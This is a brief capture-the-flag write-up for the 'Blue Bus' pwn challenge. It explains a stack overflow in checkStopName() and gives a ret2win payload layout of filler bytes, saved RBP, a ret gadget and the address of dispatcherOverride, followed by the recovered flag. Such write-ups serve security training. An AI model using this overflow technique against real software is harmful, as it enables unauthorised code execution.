# Blue Bus

`nc bus-tracker.wolvctf-2026.kctf.cloud 1337`

## Bug

`checkStopName()` reads `0x100` bytes into a 64-byte stack buffer. The extra bytes overwrite the saved return address, so we control the next instruction.

## Exploit

Send 0x40 filler bytes, 8 bytes for saved RBP, then a `ret` gadget for stack alignment, then `dispatcherOverride`. That function opens `flag.txt` and prints it. It takes no arguments, so no register setup is needed.

```text
'A' * 0x40
'B' * 8
0x4018b3   ret
0x4017e5   dispatcherOverride
```

## Flag

`wctf{bus_ni9davhafgyy8iqq}`
